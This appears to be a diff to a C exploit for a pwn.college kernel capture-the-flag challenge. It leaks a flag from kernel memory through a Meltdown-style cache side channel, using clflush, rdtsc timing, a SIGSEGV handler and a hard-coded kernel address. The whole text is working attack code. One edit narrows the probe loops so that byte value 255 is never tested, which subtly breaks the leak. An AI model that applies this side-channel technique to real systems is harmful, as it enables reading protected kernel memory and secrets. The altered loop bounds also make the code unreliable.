@@ -16,13 +16,15 @@
 
 #define DEVICE_PATH "/proc/pwncollege"
 
-#define SHMEM_SIZE 0x100000UL
 #define PAGE_SIZE 0x1000UL
 #define NUM_PAGES 256
 #define ATTEMPTS 100
+#define SHMEM_SIZE (NUM_PAGES * PAGE_SIZE)
 
 static volatile unsigned char *shared_mem;
+static sigjmp_buf jbuf;
 static uint64_t flag_addr = 0xffffffffc0002460;
+
 
 static inline uint64_t rdtsc_begin(void)
 {
@@ -40,7 +42,7 @@ static inline uint64_t rdtsc_end(void)
     return t;
 }
 
-static inline void flush_cache(const volatile void *addr)
+static inline void clflush(const volatile void *addr)
 {
     _mm_clflush((const void *)addr);
     _mm_mfence();
@@ -53,22 +55,20 @@ static inline uint64_t measure(volatile unsigned char *addr)
     return rdtsc_end() - start;
 }
 
-static void flush(void)
+static void flush_all(void)
 {
     for (unsigned i = 0; i < NUM_PAGES; ++i)
-        flush_cache(shared_mem + (size_t)i * PAGE_SIZE);
+        clflush(shared_mem + (size_t)i * PAGE_SIZE);
 }
-
-static sigjmp_buf buf;
 
 void sigsegv_handler(int sig)
 {
-    siglongjmp(buf, 1);
+    siglongjmp(jbuf, 1);
 }
 
 static void attack(int fd, int target)
 {
-    if (sigsetjmp(buf, 1) != 0)
+    if (sigsetjmp(jbuf, 1) != 0)
         return;
 
     // Prime the L1 cache with the flag data by forcing the kernel to read it
@@ -101,7 +101,7 @@ static void attack(int fd, int target)
 static void probe(unsigned scores[256], uint64_t threshold)
 {
     // Exclude value 0 because shared_mem[0] is always accessed by device_ioctl().
-    for (unsigned value = 1; value < 256; ++value)
+    for (unsigned value = 1; value < 0xff; ++value)
     {
         volatile unsigned char *addr =
             shared_mem + (size_t)value * PAGE_SIZE;
@@ -114,7 +114,7 @@ static void probe(unsigned scores[256], uint64_t threshold)
 static unsigned find_best(const unsigned scores[256])
 {
     unsigned best = 1;
-    for (unsigned value = 2; value < 256; ++value)
+    for (unsigned value = 1; value < 0xff; ++value)
     {
         if (scores[value] > scores[best])
             best = value;
@@ -134,7 +134,7 @@ static uint64_t calibrate_threshold(void)
     for (unsigned i = 0; i < ATTEMPTS; ++i)
     {
         hit_total += measure(addr);
-        flush_cache(addr);
+        clflush(addr);
         miss_total += measure(addr);
     }
 
@@ -160,7 +160,7 @@ static unsigned char leak_byte(int fd, int target, uint64_t threshold)
         for (unsigned i = 0; i < ATTEMPTS; ++i)
         {
             // train step is optional...
-            flush();
+            flush_all();
             attack(fd, target);
             probe(scores, threshold);
         }
